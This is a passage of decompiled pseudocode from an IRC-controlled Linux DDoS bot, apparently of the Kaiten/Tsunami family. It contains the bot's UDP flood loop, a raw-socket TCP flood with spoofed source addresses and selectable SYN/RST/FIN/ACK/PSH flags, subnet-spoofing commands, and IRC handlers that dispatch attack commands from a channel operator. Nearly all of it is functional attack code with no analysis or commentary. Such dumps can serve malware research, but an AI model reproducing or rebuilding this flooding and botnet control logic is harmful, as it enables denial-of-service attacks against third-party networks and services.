        close((off_t)&savedregs, d);
      }
      if ( v12 > 49 )
      {
        if ( time(0) >= v13 + v15 )
        {
          close((off_t)&savedregs, d);
          exit((off_t)&savedregs, 0);
        }
        v12 = 0;
      }
      ++v12;
    }
  }
  return result;
}
// 805D3E0: using guessed type char *udp_msg[8];

//----- (08048F07) --------------------------------------------------------
signed int __usercall unk@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int a4)
{
  signed int result; // eax@1
  int v6; // [esp+Ch] [ebp-2Ch]@4
  int v7; // [esp+10h] [ebp-28h]@4
  int v8; // [esp+14h] [ebp-24h]@4
  int v9; // [esp+18h] [ebp-20h]@4
  int v10; // [esp+1Ch] [ebp-1Ch]@1
  int d; // [esp+20h] [ebp-18h]@5
  int v12; // [esp+24h] [ebp-14h]@7
  unsigned int v13; // [esp+28h] [ebp-10h]@4
  int v14; // [esp+2Ch] [ebp-Ch]@1
  unsigned int v15; // [esp+34h] [ebp-4h]@1
  int savedregs; // [esp+38h] [ebp+0h]@1

  v10 = 1;
  v14 = malloc((off_t)&savedregs, edi0, 0x2400u);
  v15 = time(0);
  result = mfork(edi0, a2);
  if ( !result )
  {
    if ( a3 <= 1 )
      exit((off_t)&savedregs, 1);
    v13 = atol(*(_BYTE **)(a4 + 8));
    v6 = 0;
    v7 = 0;
    v8 = 0;
    v9 = 0;
    v7 = host2ip(a2, *(_DWORD *)(a4 + 4));
    LOWORD(v6) = 2;
    Send(a1, "NOTICE %s :%s %s\n", a2, off_805D3DC[0], *(_DWORD *)(a4 + 4));
    while ( 1 )
    {
      HIWORD(v6) = rand();
      d = socket(2, 2, 17);
      if ( d >= 0 )
      {
        v10 = 1;
        ioctl(d, 21537);
        sendto((off_t)&savedregs, d, v14, 9216, 0, (int)&v6, 16);
        close((off_t)&savedregs, d);
      }
      if ( v12 > 49 )
      {
        if ( time(0) >= v13 + v15 )
        {
          close((off_t)&savedregs, d);
          exit((off_t)&savedregs, 0);
        }
        v12 = 0;
      }
      ++v12;
    }
  }
  return result;
}
// 80533F0: using guessed type int rand(void);
// 805D3DC: using guessed type char *off_805D3DC[9];

//----- (0804908D) --------------------------------------------------------
int __cdecl csum(unsigned __int16 *a1, signed int a2)
{
  unsigned __int64 v3; // [esp+0h] [ebp-18h]@1

  v3 = 0LL;
  while ( a2 > 1 )
  {
    v3 += *a1;
    ++a1;
    a2 -= 2;
  }
  if ( a2 > 0 )
    v3 += *(unsigned __int8 *)a1;
  while ( v3 >> 16 )
    v3 = (v3 >> 16) + (unsigned __int16)v3;
  return (unsigned __int16)~(_WORD)v3;
}

//----- (08049135) --------------------------------------------------------
int rand_cmwc()
{
  unsigned __int64 v0; // ST08_8@1
  int v1; // ecx@3
  int v3; // [esp+18h] [ebp-10h]@1

  i_4805 = ((_WORD)i_4805 + 1) & 0xFFF;
  v0 = (unsigned int)c + 18782LL * (unsigned int)Q[i_4805];
  c = v0 >> 32;
  v3 = v0 + HIDWORD(v0);
  if ( (signed int)v0 + c < (unsigned int)c )
  {
    ++v3;
    ++c;
  }
  v1 = i_4805;
  Q[i_4805] = -2 - v3;
  return Q[v1];
}
// 805D3FC: using guessed type char *psh_msg;
// 805D400: using guessed type int c;
// 805D404: using guessed type int i_4805;

//----- (080491F5) --------------------------------------------------------
unsigned __int32 __cdecl getRandomIP(int a1)
{
  unsigned __int32 v1; // ST24_4@1

  v1 = a1 & ntohl(ourIP);
  return v1 ^ rand_cmwc() & ~a1;
}
// 806A5EC: using guessed type int ourIP;

//----- (08049225) --------------------------------------------------------
int __usercall tcpcsum@<eax>(int edi0@<edi>, int a1, _DWORD *a2)
{
  __int16 v3; // ST2A_2@1
  int v4; // ST1C_4@1
  int v5; // ST20_4@1
  int v6; // ST24_4@1
  int v7; // eax@1
  _DWORD *v8; // ST30_4@1
  _DWORD *v9; // edx@1
  unsigned __int16 v10; // ST36_2@1
  int savedregs; // [esp+28h] [ebp+0h]@1

  v3 = *(_WORD *)(a1 + 2);
  v4 = *(_DWORD *)(a1 + 12);
  v5 = *(_DWORD *)(a1 + 16);
  LOWORD(v6) = 1536;
  HIWORD(v6) = htons(20);
  v7 = malloc((off_t)&savedregs, edi0, 0x20u);
  v8 = (_DWORD *)v7;
  *(_DWORD *)v7 = v4;
  *(_DWORD *)(v7 + 4) = v5;
  *(_DWORD *)(v7 + 8) = v6;
  v9 = (_DWORD *)(v7 + 12);
  *v9 = *a2;
  v9[1] = a2[1];
  v9[2] = a2[2];
  v9[3] = a2[3];
  v9[4] = a2[4];
  v10 = csum((unsigned __int16 *)v7, 32);
  free((unsigned int)&savedregs, v8);
  return v10;
}

//----- (080492E0) --------------------------------------------------------
int __cdecl makeIPPacket(int a1, int a2, int a3, char a4, __int16 a5)
{
  int result; // eax@1

  *(_BYTE *)a1 = *(_BYTE *)a1 & 0xF0 | 5;
  *(_BYTE *)a1 = *(_BYTE *)a1 & 0xF | 0x40;
  *(_BYTE *)(a1 + 1) = 0;
  *(_WORD *)(a1 + 2) = a5 + 20;
  *(_WORD *)(a1 + 4) = rand_cmwc();
  *(_WORD *)(a1 + 6) = 0;
  *(_BYTE *)(a1 + 8) = -1;
  *(_BYTE *)(a1 + 9) = a4;
  *(_WORD *)(a1 + 10) = 0;
  *(_DWORD *)(a1 + 12) = a3;
  result = a2;
  *(_DWORD *)(a1 + 16) = a2;
  return result;
}

//----- (0804935E) --------------------------------------------------------
int __cdecl fdgets(int a1, int a2, int fd)
{
  int v4; // [esp+4h] [ebp-14h]@7
  unsigned int v5; // [esp+10h] [ebp-8h]@1
  int i; // [esp+14h] [ebp-4h]@1
  int savedregs; // [esp+18h] [ebp+0h]@2

  v5 = 1;
  for ( i = 0; v5 == 1 && i < a2 && *(_BYTE *)(a1 + i - 1) != 10; ++i )
    v5 = read((off_t)&savedregs, fd, (void *)(a1 + i), 1u);
  if ( v5 )
    v4 = a1;
  else
    v4 = 0;
  return v4;
}

//----- (080493C6) --------------------------------------------------------
int getOurIP()
{
  int v1; // [esp-8h] [ebp-1070h]@3
  int v2; // [esp+0h] [ebp-1068h]@0
  int v3; // [esp+10h] [ebp-1058h]@13
  __int16 v4; // [esp+22h] [ebp-1046h]@14
  char v5; // [esp+30h] [ebp-1038h]@5
  int v6; // [esp+1030h] [ebp-38h]@3
  char v7; // [esp+1034h] [ebp-34h]@3
  int v8; // [esp+1038h] [ebp-30h]@4
  __int16 v9; // [esp+1044h] [ebp-24h]@2
  __int16 v10; // [esp+1046h] [ebp-22h]@2
  int v11; // [esp+1048h] [ebp-20h]@2
  int v12; // [esp+104Ch] [ebp-1Ch]@2
  int v13; // [esp+1050h] [ebp-18h]@2
  int d; // [esp+1054h] [ebp-14h]@1
  int v15; // [esp+1058h] [ebp-10h]@2
  int fd; // [esp+105Ch] [ebp-Ch]@4
  char *i; // [esp+1060h] [ebp-8h]@6
  int j; // [esp+1064h] [ebp-4h]@13
  int savedregs; // [esp+1068h] [ebp+0h]@2

  d = socket(2, 2, 0);
  if ( d == -1 )
    return 0;
  v12 = 0;
  v13 = 0;
  v9 = 2;
  v11 = inet_addr("8.8.8.8");
  v10 = htons(53);
  v15 = connect((off_t)&savedregs, d, (int)&v9, 16);
  if ( v15 == -1 )
    return 0;
  v6 = 16;
  v15 = getsockname(d, (int)&v7, (int)&v6);
  if ( v15 == -1 )
    return 0;
  ourIP = v8;
  fd = open((off_t)&savedregs, "/proc/net/route", 0, v1);
  while ( fdgets((int)&v5, 4096, fd) )
  {
    if ( strstr((unsigned __int8 *)&v5, "\t00000000\t") )
    {
      for ( i = &v5; *i != 9; ++i )
        ;
      *i = 0;
      break;
    }
    memset(&v5, 0, 0x1000u);
  }
  close((off_t)&savedregs, fd);
  if ( v5 )
  {
    strcpy(&v3, &v5);
    ioctl(d, 35111);
    for ( j = 0; j <= 5; ++j )
      macAddress[j] = *((_BYTE *)&v4 + j);
  }
  close((off_t)&savedregs, d);
  return v2;
}
// 806A5EC: using guessed type int ourIP;

//----- (080495CF) --------------------------------------------------------
void __cdecl tcp(int a1, int a2, signed int a3, _DWORD *a4)
{
  char *v4; // eax@5
  unsigned int v5; // eax@11
  void *v6; // esp@11
  unsigned int v7; // ebx@11
  unsigned __int32 v8; // eax@11
  int v9; // eax@11
  __int16 v10; // ax@11
  char *v11; // eax@11
  bool v12; // cf@11
  bool v13; // zf@11
  char *v14; // esi@11
  const char *v15; // edi@11
  signed int v16; // ecx@11
  char *v17; // eax@16
  char *v18; // esi@17
  signed int v19; // ecx@17
  bool v20; // cf@19
  bool v21; // zf@19
  int v22; // eax@20
  bool v23; // cf@20
  bool v24; // zf@20
  char *v25; // esi@22
  signed int v26; // ecx@22
  int v27; // eax@25
  bool v28; // cf@25
  bool v29; // zf@25
  char *v30; // esi@27
  signed int v31; // ecx@27
  int v32; // eax@30
  bool v33; // cf@30
  bool v34; // zf@30
  char *v35; // esi@32
  signed int v36; // ecx@32
  int v37; // eax@35
  bool v38; // cf@35
  bool v39; // zf@35
  char *v40; // esi@37
  signed int v41; // ecx@37
  __int16 v42; // ax@44
  __int16 v43; // ax@47
  __int16 v44; // ax@47
  unsigned int v45; // ebx@47
  unsigned __int32 v46; // eax@48
  unsigned __int32 v47; // eax@48
  __int16 v48; // ax@48
  __int16 v49; // ax@48
  __int16 v50; // ax@48
  __int16 v51; // ax@48
  int v52; // [esp-10h] [ebp-B8h]@11
  int v53; // [esp+0h] [ebp-A8h]@2
  int v54; // [esp+Ch] [ebp-9Ch]@11
  const char *v55; // [esp+10h] [ebp-98h]@37
  char *v56; // [esp+14h] [ebp-94h]@37
  int v57; // [esp+18h] [ebp-90h]@32
  const char *v58; // [esp+1Ch] [ebp-8Ch]@32
  char *v59; // [esp+20h] [ebp-88h]@32
  int v60; // [esp+24h] [ebp-84h]@27
  const char *v61; // [esp+28h] [ebp-80h]@27
  char *v62; // [esp+2Ch] [ebp-7Ch]@27
  int v63; // [esp+30h] [ebp-78h]@22
  const char *v64; // [esp+34h] [ebp-74h]@22
  char *v65; // [esp+38h] [ebp-70h]@22
  int v66; // [esp+3Ch] [ebp-6Ch]@17
  const char *v67; // [esp+40h] [ebp-68h]@17
  char *v68; // [esp+44h] [ebp-64h]@17
  int v69; // [esp+48h] [ebp-60h]@11
  const char *v70; // [esp+4Ch] [ebp-5Ch]@11
  char *v71; // [esp+50h] [ebp-58h]@11
  int v72; // [esp+54h] [ebp-54h]@11
  unsigned int v73; // [esp+58h] [ebp-50h]@11
  __int16 v74; // [esp+5Eh] [ebp-4Ah]@45
  int *v75; // [esp+60h] [ebp-48h]@2
  unsigned int v76; // [esp+64h] [ebp-44h]@2
  int j; // [esp+68h] [ebp-40h]@47
  int v78; // [esp+6Ch] [ebp-3Ch]@7
  __int16 v79; // [esp+70h] [ebp-38h]@2
  unsigned __int16 v80; // [esp+72h] [ebp-36h]@3
  int v81; // [esp+74h] [ebp-34h]@5
  int v82; // [esp+78h] [ebp-30h]@6
  int v83; // [esp+7Ch] [ebp-2Ch]@6
  unsigned __int16 *v84; // [esp+80h] [ebp-28h]@11
  int v85; // [esp+84h] [ebp-24h]@6
  int v86; // [esp+88h] [ebp-20h]@9
  int v87; // [esp+8Ch] [ebp-1Ch]@11
  unsigned int v88; // [esp+90h] [ebp-18h]@11
  int v89; // [esp+94h] [ebp-14h]@47
  char *i; // [esp+98h] [ebp-10h]@16
  int savedregs; // [esp+A8h] [ebp+0h]@5

  if ( a3 > 6 )
  {
    v75 = &v53;
    v76 = atol((_BYTE *)a4[7]);
    v79 = 2;
    v80 = atol((_BYTE *)a4[2]) ? (unsigned __int16)atol((_BYTE *)a4[2]) : (unsigned __int16)rand_cmwc();
    v4 = strdup((off_t)&savedregs, (char *)a4[1]);
    if ( !getHost((int)v4, &v81) )
    {
      v82 = 0;
      v83 = 0;
      v85 = socket(2, 3, 6);
      if ( v85 )
      {
        v78 = 1;
        if ( setsockopt(v85, 0, 3, (int)&v78, 4) >= 0 )
        {
          if ( atol((_BYTE *)a4[4]) )
            v86 = -(1 << (32 - atol((_BYTE *)a4[4])));
          else
            v86 = 0;
          v5 = atol((_BYTE *)a4[6]);
          v72 = v5 + 40;
          v6 = alloca(16 * ((v5 + 70) >> 4));
          v73 = 16 * (((unsigned int)&v54 + 3) >> 4);
          v84 = (unsigned __int16 *)(16 * (((unsigned int)&v54 + 3) >> 4));
          v87 = 16 * (((unsigned int)&v54 + 3) >> 4);
          v88 = 16 * (((unsigned int)&v54 + 3) >> 4) + 20;
          v7 = atol((_BYTE *)a4[6]) + 20;
          v8 = getRandomIP(v86);
          v9 = htonl(v8);
          makeIPPacket(v87, v81, v9, 6, v7);
          v10 = rand_cmwc();
          *(_WORD *)v88 = v10;
          *(_DWORD *)(v88 + 4) = rand_cmwc();
          *(_DWORD *)(v88 + 8) = 0;
          *(_BYTE *)(v88 + 12) = *(_BYTE *)(v88 + 12) & 0xF | 0x50;
          v11 = strdup((off_t)&savedregs, (char *)a4[5]);
          v12 = __CFADD__(&v52, 16);
          v13 = &v53 == 0;
          v71 = v11;
          v70 = "all";
          v69 = 4;
          v14 = v11;
          v15 = "all";
          v16 = 4;
          do
          {
            if ( !v16 )
              break;
            v12 = (unsigned __int8)*v14 < *v15;
            v13 = *v14++ == *v15++;
            --v16;
          }
          while ( v13 );
          if ( (!v12 && !v13) == v12 )
          {
            *(_BYTE *)(v88 + 13) |= 2u;
            *(_BYTE *)(v88 + 13) |= 4u;
            *(_BYTE *)(v88 + 13) |= 1u;
            *(_BYTE *)(v88 + 13) |= 0x10u;
            *(_BYTE *)(v88 + 13) |= 8u;
            Send(a1, "NOTICE %s :%s %s\n", a2, tcp_msg[0], a4[1]);
          }
          else
          {
            v17 = strdup((off_t)&savedregs, (char *)a4[5]);
            for ( i = strtok(v17, ","); ; i = strtok(0, ",") )
            {
              v20 = 0;
              v21 = i == 0;
              if ( !i )
                break;
              v68 = i;
              v67 = "syn";
              v66 = 4;
              v18 = i;
              v15 = "syn";
              v19 = 4;
              do
              {
                if ( !v19 )
                  break;
                v20 = (unsigned __int8)*v18 < *v15;
                v21 = *v18++ == *v15++;
                --v19;
              }
              while ( v21 );
              v22 = (char)((!v20 && !v21) - v20);
              v23 = 0;
              v24 = v22 == 0;
              if ( v22 )
              {
                v65 = i;
                v64 = "rst";
                v63 = 4;
                v25 = i;
                v15 = "rst";
                v26 = 4;
                do
                {
                  if ( !v26 )
                    break;
                  v23 = (unsigned __int8)*v25 < *v15;
                  v24 = *v25++ == *v15++;
                  --v26;
                }
                while ( v24 );
                v27 = (char)((!v23 && !v24) - v23);
                v28 = 0;
                v29 = v27 == 0;
                if ( v27 )
                {
                  v62 = i;
                  v61 = "fin";
                  v60 = 4;
                  v30 = i;
                  v15 = "fin";
                  v31 = 4;
                  do
                  {
                    if ( !v31 )
                      break;
                    v28 = (unsigned __int8)*v30 < *v15;
                    v29 = *v30++ == *v15++;
                    --v31;
                  }
                  while ( v29 );
                  v32 = (char)((!v28 && !v29) - v28);
                  v33 = 0;
                  v34 = v32 == 0;
                  if ( v32 )
                  {
                    v59 = i;
                    v58 = "ack";
                    v57 = 4;
                    v35 = i;
                    v15 = "ack";
                    v36 = 4;
                    do
                    {
                      if ( !v36 )
                        break;
                      v33 = (unsigned __int8)*v35 < *v15;
                      v34 = *v35++ == *v15++;
                      --v36;
                    }
                    while ( v34 );
                    v37 = (char)((!v33 && !v34) - v33);
                    v38 = 0;
                    v39 = v37 == 0;
                    if ( v37 )
                    {
                      v56 = i;
                      v55 = "psh";
                      v54 = 4;
                      v40 = i;
                      v15 = "psh";
                      v41 = 4;
                      do
                      {
                        if ( !v41 )
                          break;
                        v38 = (unsigned __int8)*v40 < *v15;
                        v39 = *v40++ == *v15++;
                        --v41;
                      }
                      while ( v39 );
                      if ( (!v38 && !v39) == v38 )
                      {
                        *(_BYTE *)(v88 + 13) |= 8u;
                        Send(a1, "NOTICE %s :%s %s\n", a2, psh_msg, a4[1]);
                      }
                    }
                    else
                    {
                      *(_BYTE *)(v88 + 13) |= 0x10u;
                      Send(a1, "NOTICE %s :%s %s\n", a2, ack_msg[0], a4[1]);
                    }
                  }
                  else
                  {
                    *(_BYTE *)(v88 + 13) |= 1u;
                    Send(a1, "NOTICE %s :%s %s\n", a2, fin_msg[0], a4[1]);
                  }
                }
                else
                {
                  *(_BYTE *)(v88 + 13) |= 4u;
                  Send(a1, "NOTICE %s :%s %s\n", a2, rst_msg[0], a4[1]);
                }
              }
              else
              {
                *(_BYTE *)(v88 + 13) |= 2u;
                Send(a1, "NOTICE %s :%s %s\n", a2, syn_msg[0], a4[1]);
              }
            }
          }
          v42 = rand_cmwc();
          *(_WORD *)(v88 + 14) = v42;
          *(_WORD *)(v88 + 16) = 0;
          *(_WORD *)(v88 + 18) = 0;
          if ( atol((_BYTE *)a4[2]) )
            v74 = atol((_BYTE *)a4[2]);
          else
            v74 = rand_cmwc();
          *(_WORD *)(v88 + 2) = v74;
          v43 = tcpcsum((int)v15, v87, (_DWORD *)v88);
          *(_WORD *)(v88 + 16) = v43;
          v44 = csum(v84, *(unsigned __int16 *)(v87 + 2));
          *(_WORD *)(v87 + 10) = v44;
          v45 = time(0);
          v89 = v45 + atol((_BYTE *)a4[3]);
          for ( j = 0; ; j = 0 )
          {
            while ( 1 )
            {
              sendto((off_t)&savedregs, v85, (int)v84, v72, 0, (int)&v79, 16);
              v46 = getRandomIP(v86);
              v47 = htonl(v46);
              *(_DWORD *)(v87 + 12) = v47;
              v48 = rand_cmwc();
              *(_WORD *)(v87 + 4) = v48;
              *(_DWORD *)(v88 + 4) = rand_cmwc();
              v49 = rand_cmwc();
              *(_WORD *)v88 = v49;
              *(_WORD *)(v88 + 16) = 0;
              v50 = tcpcsum((int)v15, v87, (_DWORD *)v88);
              *(_WORD *)(v88 + 16) = v50;
              v51 = csum(v84, *(unsigned __int16 *)(v87 + 2));
              *(_WORD *)(v87 + 10) = v51;
              v15 = (const char *)v76;
              if ( j == v76 )
                break;
              ++j;
            }
            if ( (signed int)time(0) > v89 )
              break;
          }
        }
      }
    }
  }
}
// 805D3E8: using guessed type char *tcp_msg[6];
// 805D3EC: using guessed type char *syn_msg[5];
// 805D3F0: using guessed type char *ack_msg[4];
// 805D3F4: using guessed type char *fin_msg[3];
// 805D3F8: using guessed type char *rst_msg[2];
// 805D3FC: using guessed type char *psh_msg;

//----- (08049CD2) --------------------------------------------------------
void ssh_scan()
{
  ;
}

//----- (08049CD7) --------------------------------------------------------
void telnet_scan()
{
  ;
}

//----- (08049CDC) --------------------------------------------------------
unsigned int __cdecl killsec(int a1, char *a2)
{
  unsigned int result; // eax@2

  if ( !strcasecmp((unsigned __int8 *)admin[0], (unsigned __int8 *)a2) )
    result = kill(0, 9);
  else
    result = Send(a1, "PRIVMSG %s :You do not have permission to do this.\n", chan);
  return result;
}
// 805D3D4: using guessed type char *admin[11];
// 806A5F8: using guessed type int chan;

//----- (08049D26) --------------------------------------------------------
int __cdecl stop(int a1, int a2)
{
  int v2; // ebx@3
  int v3; // ebx@11
  int result; // eax@14
  unsigned int i; // [esp+10h] [ebp-8h]@1
  unsigned int j; // [esp+10h] [ebp-8h]@9

  for ( i = 0; i < numpids; ++i )
  {
    if ( *(_DWORD *)(4 * i + pids) )
    {
      v2 = *(_DWORD *)(4 * i + pids);
      if ( v2 != getpid() )
      {
        if ( a2 )
          Send(a1, "PRIVMSG %s :Killing PID %d.\n", chan, *(_DWORD *)(4 * i + pids));
        kill(*(_DWORD *)(4 * i + pids), 9);
      }
    }
  }
  for ( j = 0; ; ++j )
  {
    result = numpids;
    if ( j >= numpids )
      break;
    if ( *(_DWORD *)(4 * j + pids) )
    {
      v3 = *(_DWORD *)(4 * j + pids);
      if ( v3 != getpid() )
        kill(*(_DWORD *)(4 * j + pids), 9);
    }
  }
  return result;
}
// 8061C50: using guessed type int numpids;
// 806A5F8: using guessed type int chan;
// 806A5FC: using guessed type int pids;

//----- (08049E37) --------------------------------------------------------
unsigned int __cdecl spoof(int a1, int a2, int a3, int a4)
{
  unsigned int result; // eax@2
  char *v5; // eax@13
  double v6; // ST08_8@17
  int v7; // eax@17
  char v8[256]; // [esp+18h] [ebp-110h]@5
  unsigned int i; // [esp+118h] [ebp-10h]@7
  int v10; // [esp+11Ch] [ebp-Ch]@7
  int v11; // [esp+120h] [ebp-8h]@15

  if ( a3 == 1 )
  {
    if ( strlen(*(const char **)(a4 + 4)) <= 0x10 )
    {
      strcpy(v8, *(char **)(a4 + 4));
      if ( v8[strlen(v8) - 1] == 46 )
        v8[strlen(v8) - 1] = 0;
      i = 0;
      v10 = 1;
      while ( i < strlen(v8) )
      {
        if ( v8[i] == 46 )
          ++v10;
        ++i;
      }
      v10 = 4 - v10;
      for ( i = 0; (signed int)i < v10; ++i )
      {
        v5 = &v8[strlen(v8)];
        *(_WORD *)v5 = 12334;
        v5[2] = 0;
      }
      v11 = inet_network((unsigned __int8 *)v8);
      if ( v10 )
      {
        HIDWORD(v6) = v10;
        LODWORD(v6) = 256;
        pow(v6);
        spoofsm = v7;
      }
      else
      {
        spoofsm = 1;
      }
      spoofs = v11;
      result = Send(a1, "NOTICE %s :Subnet Has Been Spoofed - %s.\n", a2, *(_DWORD *)(a4 + 4));
    }
    else
    {
      result = Send(a1, "NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n", a2);
    }
  }
  else
  {
    result = Send(a1, "NOTICE %s :Removed all spoofs\n", a2);
    spoofs = 0;
    spoofsm = 0;
  }
  return result;
}
// 8049FF8: inconsistent fpu stack
// 8061C48: using guessed type int spoofs;
// 8061C4C: using guessed type int spoofsm;
// 8049E37: using guessed type char var_110[256];

//----- (0804A02E) --------------------------------------------------------
unsigned int __cdecl getspoofs(int a1, int a2)
{
  unsigned int result; // eax@2
  int v3; // [esp+14h] [ebp-14h]@1

  v3 = spoofsm + spoofs - 1;
  if ( spoofsm == 1 )
    result = Send(
               a1,
               "NOTICE %s :Spoofs: %d.%d.%d.%d\n",
               a2,
               HIBYTE(spoofs),
               BYTE2(spoofs),
               BYTE1(spoofs),
               (unsigned __int8)spoofs);
  else
    result = Send(
               a1,
               "NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",
               a2,
               HIBYTE(spoofs),
               BYTE2(spoofs),
               BYTE1(spoofs),
               (unsigned __int8)spoofs,
               HIBYTE(v3),
               BYTE2(v3),
               BYTE1(v3),
               (unsigned __int8)v3);
  return result;
}
// 8061C48: using guessed type int spoofs;
// 8061C4C: using guessed type int spoofsm;

//----- (0804A15F) --------------------------------------------------------
void __cdecl move(int fd, int a2, int a3, int a4)
{
  int savedregs; // [esp+8h] [ebp+0h]@3

  if ( a3 > 0 )
  {
    if ( !strcasecmp((unsigned __int8 *)admin[0], (unsigned __int8 *)a2) )
    {
      server = (int)strdup((off_t)&savedregs, *(char **)(a4 + 4));
      changeservers = 1;
      close((off_t)&savedregs, fd);
    }
    else
    {
      Send(fd, "PRIVMSG %s :You do not have permission to do this.\n", chan);
    }
  }
}
// 805D3D4: using guessed type char *admin[11];
// 8061C40: using guessed type int changeservers;
// 806A5E8: using guessed type int server;
// 806A5F8: using guessed type int chan;

//----- (0804A1D1) --------------------------------------------------------
char __cdecl PRIVMSG(int a1, const char *a2, const char *a3)
{
  char *v3; // eax@9
  int v4; // edi@25
  unsigned int v5; // kr14_4@25
  unsigned int v6; // kr18_4@32
  int v7; // ebx@34
  char v9[1024]; // [esp+2Ch] [ebp-44Ch]@11
  int v10[12]; // [esp+42Ch] [ebp-4Ch]@28
  unsigned int i; // [esp+45Ch] [ebp-1Ch]@1
  unsigned __int8 *v12; // [esp+460h] [ebp-18h]@5
  char *v13; // [esp+464h] [ebp-14h]@5
  int v14; // [esp+468h] [ebp-10h]@11
  int j; // [esp+46Ch] [ebp-Ch]@16
  int savedregs; // [esp+478h] [ebp+0h]@34

  for ( i = 0; i < strlen(a3) && a3[i] != 32; ++i )
    ;
  a3[i] = 0;
  v12 = (unsigned __int8 *)a3;
  v13 = (char *)&a3[i + 2];
  for ( i = 0; i < strlen(a2) && a2[i] != 33; ++i )
    ;
  a2[i] = 0;
  LOBYTE(v3) = *v13;
  if ( *v13 == 62 )
  {
    v3 = (char *)strcasecmp(v12, (unsigned __int8 *)chan);
    if ( !v3 )
    {
      memset(v9, 0, 0x400u);
      v14 = 0;
      ++v13;
      for ( i = 0; i < strlen(v13) && v13[i] != 32; ++i )
        ;
      v13[i] = 0;
      v3 = (char *)strwildmatch(v13, (unsigned __int8 *)nick);
      if ( !v3 )
      {
        v13 += i + 1;
        j = strlen(v13);
        for ( i = 0; (signed int)i < j && *v13 != 32 && *v13; ++i )
          v9[i] = *v13++;
        for ( i = 0; ; ++i )
        {
          v5 = strlen(v13) + 1;
          v4 = (int)&v13[v5];
          if ( i >= v5 - 1 )
            break;
          if ( v13[i] == 32 )
            ++v14;
        }
        if ( ++v14 > 10 )
          v14 = 10;
        v10[0] = (int)v9;
        v10[v14 + 1] = (int)&unk_805A274;
        j = 1;
        while ( *v13 )
        {
          ++v13;
          if ( j >= v14 )
            break;
          for ( i = 0; ; ++i )
          {
            v6 = strlen(v13) + 1;
            v4 = (int)&v13[v6];
            if ( i >= v6 - 1 || v13[i] == 32 )
              break;
          }
          v7 = j;
          v10[v7] = malloc((off_t)&savedregs, v4, i + 1);
          strncpy((_BYTE *)v10[j], v13, i);
          *(_BYTE *)(v10[j++] + i) = 0;
          v13 += i;
        }
        for ( j = 0; ; ++j )
        {
          v3 = (&flooders)[2 * j];
          if ( !v3 )
            break;
          if ( !strcasecmp((unsigned __int8 *)(&flooders)[2 * j], (unsigned __int8 *)v9) )
          {
            ((void (__usercall *)(int@<edi>, int, int, signed int, int *))*(&off_805D424 + 2 * j))(
              v4,
              a1,
              (int)a2,
              v14 - 1,
              v10);
            for ( i = 1; ; ++i )
            {
              LOBYTE(v3) = i;
              if ( (signed int)i >= v14 )
                break;
              free((unsigned int)&savedregs, (_DWORD *)v10[i]);
            }
            return (char)v3;
          }
        }
      }
    }
  }
  return (char)v3;
}
// 805D420: using guessed type char *flooders;
// 805D424: using guessed type int (__cdecl *off_805D424)(int, int, int, int);
// 806A5DC: using guessed type int nick;
// 806A5F8: using guessed type int chan;
// 804A1D1: using guessed type char var_44C[1024];
// 804A1D1: using guessed type int var_4C[12];

//----- (0804A52A) --------------------------------------------------------
unsigned int __cdecl 376(int a1)
{
  Send(a1, "MODE %s +pixB\n", nick);
  Send(a1, "JOIN %s :%s\n", chan, key);
  return Send(a1, "WHO %s\n", nick);
}
// 806A5DC: using guessed type int nick;
// 806A5F4: using guessed type int key;
// 806A5F8: using guessed type int chan;

//----- (0804A581) --------------------------------------------------------
unsigned int __cdecl PING(int a1, int a2, int a3)
{
  return Send(a1, "PONG %s\n", a3);
}

//----- (0804A59F) --------------------------------------------------------
int *__cdecl 352(int a1, int a2, const char *a3)
{
  int *result; // eax@5
  int v4; // [esp+2Ch] [ebp-1Ch]@25
  int *j; // [esp+30h] [ebp-18h]@1
  int i; // [esp+34h] [ebp-14h]@1
  char *v7; // [esp+38h] [ebp-10h]@1
  int *v8; // [esp+3Ch] [ebp-Ch]@26

  v7 = (char *)a3;
  j = 0;
  for ( i = 0; i <= 4; ++i )
  {
    while ( (unsigned int)j < strlen(a3) && *v7 != 32 )
    {
      ++v7;
      j = (int *)((char *)j + 1);
    }
    ++v7;
    result = (int *)strlen(a3);
    if ( j == result )
      return result;
  }
  for ( j = 0; (unsigned int)j < strlen(v7) && *((_BYTE *)j + (_DWORD)v7) != 32; j = (int *)((char *)j + 1) )
    ;
  *((_BYTE *)j + (_DWORD)v7) = 0;
  result = (int *)strcasecmp((unsigned __int8 *)v7, (unsigned __int8 *)nick);
  if ( !result )
  {
    result = (int *)spoofsm;
    if ( !spoofsm )
    {
      v7 = (char *)a3;
      j = 0;
      for ( i = 0; i <= 2; ++i )
      {
        while ( (unsigned int)j < strlen(a3) && *v7 != 32 )
        {
          ++v7;
          j = (int *)((char *)j + 1);
        }
        ++v7;
        result = (int *)strlen(a3);
        if ( j == result )
          return result;
      }
      for ( j = 0; (unsigned int)j < strlen(v7) && *((_BYTE *)j + (_DWORD)v7) != 32; j = (int *)((char *)j + 1) )
        ;
      *((_BYTE *)j + (_DWORD)v7) = 0;
      v4 = inet_addr(v7);
      if ( v4 == -1 )
      {
        result = (int *)gethostbyname((unsigned __int8 *)v7);
        v8 = result;
        if ( !result )
          return result;
        qmemcpy(&v4, *(const void **)v8[4], v8[3]);
      }
      HIBYTE(spoofs) = v4;
      BYTE2(spoofs) = BYTE1(v4);
      BYTE1(spoofs) = BYTE2(v4);
      result = &spoofs;
      LOBYTE(spoofs) = 0;
      spoofsm = 256;
    }
  }
  return result;
}
// 8061C48: using guessed type int spoofs;
// 8061C4C: using guessed type int spoofsm;
// 806A5DC: using guessed type int nick;

//----- (0804A7CA) --------------------------------------------------------
char *__usercall 433@<eax>(int a1@<edi>)
{
  char *result; // eax@1
  char v2; // [esp+Eh] [ebp-3Ah]@1
  char *v3; // [esp+40h] [ebp-8h]@1
  char *v4; // [esp+44h] [ebp-4h]@1
  int savedregs; // [esp+48h] [ebp+0h]@1

  free((unsigned int)&savedregs, (_DWORD *)nick);
  v3 = bot_prefix[0];
  v4 = makestring(a1);
  strcpy(&v2, v3);
  strcat(&v2, v4);
  result = &v2;
  nick = (int)&v2;
  return result;
}
// 805D3D8: using guessed type char *bot_prefix[10];
// 806A5DC: using guessed type int nick;

//----- (0804A81F) --------------------------------------------------------
int con()
{
  __int16 v0; // ax@11
  int v2; // [esp+8h] [ebp-20h]@1
  __int16 v3; // [esp+Ch] [ebp-1Ch]@11
  __int16 v4; // [esp+Eh] [ebp-1Ah]@11
